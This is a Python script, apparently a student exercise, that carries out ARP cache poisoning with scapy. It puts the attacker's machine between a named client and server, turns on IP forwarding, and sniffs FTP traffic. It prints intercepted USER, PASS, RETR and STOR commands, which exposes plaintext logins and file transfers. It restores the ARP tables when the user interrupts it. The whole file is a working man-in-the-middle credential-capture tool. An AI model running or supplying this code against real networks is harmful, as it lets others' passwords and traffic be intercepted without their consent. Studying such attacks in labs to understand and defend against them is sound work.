#!/usr/bin/env python3
import os
import sys
import ipaddress
import re
import time
from scapy.all import ARP, send, sniff, TCP, Raw, Ether, get_if_hwaddr

class Inquisitor():
    def __init__(self, argument):
        self.ip_addr_host = argument[1]
        self.mac_addr_host = argument[2]
        self.ip_addr_serv = argument[3]
        self.mac_addr_serv = argument[4]
        self.iface = "eth0"
        self.my_mac = get_if_hwaddr(self.iface)
        print(f"Constructor, inquisition set : {self.mac_addr_host} + {self.ip_addr_host} + {self.mac_addr_serv} + {self.ip_addr_serv}")

    def restore(self):
        print("# -- Restoring ARP tables -- #")
        from scapy.all import sendp 
        # -- Restoration package -- #
        restore_client = Ether(dst=self.mac_addr_host) / ARP(op=2, pdst=self.ip_addr_host, hwdst=self.mac_addr_host, psrc=self.ip_addr_serv, hwsrc=self.mac_addr_serv)                  
        restore_serv = Ether(dst=self.mac_addr_serv) / ARP(op=2, pdst=self.ip_addr_serv, hwdst=self.mac_addr_serv, psrc=self.ip_addr_host, hwsrc=self.mac_addr_host)
        # -- Using count to make sure it work -- #
        sendp(restore_client, verbose=False, iface=self.iface, count=5)
        sendp(restore_serv, verbose=False, iface=self.iface, count=5)
        print("# -- Restoration complete -- #")

    def send_poison(self):
        # Poison package for client # 
        poison_client = Ether(src=self.my_mac, dst=self.mac_addr_host) / \
                        ARP(op=2, pdst=self.ip_addr_host, hwdst=self.mac_addr_host, \
                            psrc=self.ip_addr_serv, hwsrc=self.my_mac)
        
        # Poison package for server # 
        poison_serv = Ether(src=self.my_mac, dst=self.mac_addr_serv) / \
                      ARP(op=2, pdst=self.ip_addr_serv, hwdst=self.mac_addr_serv, \
                          psrc=self.ip_addr_host, hwsrc=self.my_mac)
        # Sending the package #
        from scapy.all import sendp
        sendp(poison_client, verbose=False, iface=self.iface)
        sendp(poison_serv, verbose=False, iface=self.iface)

    def packet_callback(self, packet):
        if(packet.haslayer(Raw)):
            try:
                payload = packet[Raw].load.decode('utf-8', errors='ignore')
                if any(cmd in payload for cmd in ["RETR", "STOR", "USER", "PASS"]):
                    print(f"\n[!] INTERCEPTED: {payload.strip()}")
            except:
                pass

    def run(self):
        print("# -- Starting port forwording -- #")
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        try:
            print("# -- Initalise the poison loop -- #")
            while True:
                self.send_poison()
                sniff(filter="tcp port 21", prn=self.packet_callback, store=0, timeout=1, iface=self.iface)
        except KeyboardInterrupt :
            self.restore()
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
            print("# -- Poison loop has been manually stopped -- #")
            sys.exit(0)

    def verify_addr(self):
        pattern = r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$'
        try:
            ipaddress.IPv4Address(self.ip_addr_host)
            ipaddress.IPv4Address(self.ip_addr_serv)
            print("Ipv4 are valid!")
            if not re.match(pattern, self.mac_addr_host) or not re.match(pattern, self.mac_addr_serv):
                print("ERROR")
                return False
            print("MacAddress are valid!")
            return True
            
        except Exception as e:
            print(f"[ERROR], {e}")
            return False


    def poisoning(self):
        print("All the logic about the change of IP in the networks")
        self.verify_addr()

def main():
    if(len(sys.argv) < 5):
        print("[ERROR, not enought args]")
        return
    inquisition = Inquisitor(sys.argv)
    if not inquisition.verify_addr(): 
        print("[ERROR], the data you initialise are not valid")
        return
    inquisition.run()
    

if (__name__ == "__main__"):
    main()